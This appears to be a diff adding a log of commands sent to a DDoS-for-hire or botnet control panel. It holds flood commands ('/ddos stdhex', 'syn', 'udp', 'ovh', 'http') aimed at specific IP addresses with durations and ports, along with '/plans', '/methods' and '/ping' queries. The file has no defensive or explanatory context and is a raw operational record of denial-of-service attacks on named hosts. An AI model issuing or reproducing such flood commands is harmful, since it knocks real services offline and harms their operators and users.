@@ -1,0 +1,33 @@
+/plans
+/methods
+/plans
+/plan
+/tr4p
+/DDoS stdhex 73.162.59.93 30
+/DDoS syn 109.201.148.60 30
+/DDoS stdhex 138.197.157.32 60
+/DDos tcp 138.197.157.32 30
+/methods
+/DDoS http http://91.232.174.70 30
+/ddos udp 100.16.81.71 60
+/ddos greeth 100.16.81.71 60
+/ddos stdhex 94.4.11.209 30
+/tr4p
+/methods
+/ddos ovh 158.69.156.168 30 dport=22
+/ddos stdhex 30206 20 dport=30206
+/ddos stdhex 20.54.3.129 20 dport=30206
+/ping 8.8.8.8
+/ping 73.162.59.93
+/ddos stdhex 73.162.59.93 30 dport=80
+/ping 73.162.59.93
+/ping 73.162.59.93
+/ping 73.162.59.93
+/methods
+/ddos stdhex 192.99.43.146 30 dport=443
+/ddos stdhex 145.239.12.171 30 dport=22
+/ddos stdhex 178.32.107.154 30 dport=22
+/plan
+/ddos stdhex 100.16.81.71 120 dprot=80
+/ddos stdhex 100.16.81.71 120 dport=80
+/ping 100.16.81.71
